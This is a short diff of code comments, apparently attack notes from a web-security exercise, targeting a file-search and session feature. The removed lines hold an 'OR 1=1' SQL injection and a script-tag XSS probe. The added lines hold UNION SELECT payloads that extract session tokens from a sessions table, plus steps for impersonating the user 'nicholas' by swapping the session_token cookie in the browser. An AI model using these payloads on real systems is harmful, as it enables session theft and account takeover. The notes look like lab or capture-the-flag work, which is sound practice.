@@ -1,5 +1,4 @@
-// Nicholas' token will not be in database, mut instead 'disguise' user dev as nicholas
-// Search For File
-// nicholas'OR 1=1--'// remove 2nd ' in List File --> Search for a file
-// File To Upload
-<script>a</script>
+// zzyx'OR 1=2 UNION SELECT token FROM sessions'--
+// inspect elem, put
+// garbage' OR 1=2 UNION SELECT 'nicholas' FROM files' --
+// as session_token
